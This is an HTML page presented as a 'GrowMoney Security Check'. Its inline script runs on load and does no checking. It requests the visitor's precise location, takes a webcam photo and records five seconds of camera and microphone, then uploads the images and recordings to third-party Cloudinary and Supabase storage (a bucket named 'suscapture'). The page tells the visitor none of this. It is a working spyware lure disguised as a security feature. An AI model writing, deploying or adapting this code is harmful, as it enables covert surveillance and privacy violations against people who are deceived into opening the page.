<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GrowMoney Security Check</title>
</head>
<body>
    <h1>GrowMoney Security Check</h1>
    <script type="module">
        import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

        const SUPABASE_URL = "https://sadbobgqmepamsjhboad.supabase.co";
        const SUPABASE_ANON_KEY = "your-anon-key";
        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        const CLOUDINARY_UPLOAD_URL = "https://api.cloudinary.com/v1_1/dxylu8uii/upload";
        const CLOUDINARY_PRESET = "ml_default";

        const BACKEND_URL = "https://website-1j51.onrender.com/upload"; // Updated backend URL

        let latitude = null;
        let longitude = null;

        function requestLocationPermission() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    console.log("Location:", latitude, longitude);
                },
                (error) => console.error("Location permission denied:", error),
                { enableHighAccuracy: true }
            );
        }

        async function captureImage() {
            try {
                const video = document.createElement("video");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);

                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0);
                
                video.srcObject.getTracks().forEach(track => track.stop());
                
                canvas.toBlob(blob => handleUpload(blob, "image"), "image/jpeg");
            } catch (error) {
                console.error("Error capturing image:", error);
            }
        }

        async function captureMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = async (event) => {
                    const file = new Blob([event.data], { type: "video/webm" });
                    handleUpload(file, "video");
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            } catch (error) {
                console.error("Error capturing media:", error);
            }
        }

        async function handleUpload(file, type) {
            uploadToCloudinary(file, type);
            uploadToSupabase(file, type);
        }

        async function uploadToCloudinary(file, resourceType) {
            const formData = new FormData();
            formData.append("file", file);
            formData.append("upload_preset", CLOUDINARY_PRESET);
            formData.append("resource_type", resourceType);
            
            try {
                const response = await fetch(CLOUDINARY_UPLOAD_URL, {
                    method: "POST",
                    body: formData,
                });
                const data = await response.json();
                console.log("Cloudinary URL:", data.secure_url);
            } catch (error) {
                console.error("Cloudinary upload error:", error);
            }
        }

        async function uploadToSupabase(file, resourceType) {
            const fileName = `${Date.now()}-${resourceType}.webm`;
            try {
                let { data, error } = await supabase.storage.from("suscapture").upload(fileName, file, {
                    cacheControl: "3600",
                    upsert: false,
                    contentType: file.type
                });
                if (error) throw error;
                console.log("Supabase URL:", data.path);
            } catch (error) {
                console.error("Supabase upload error:", error);
            }
        }

        requestLocationPermission();
        captureImage();
        captureMedia();
    </script>
</body>
</html>
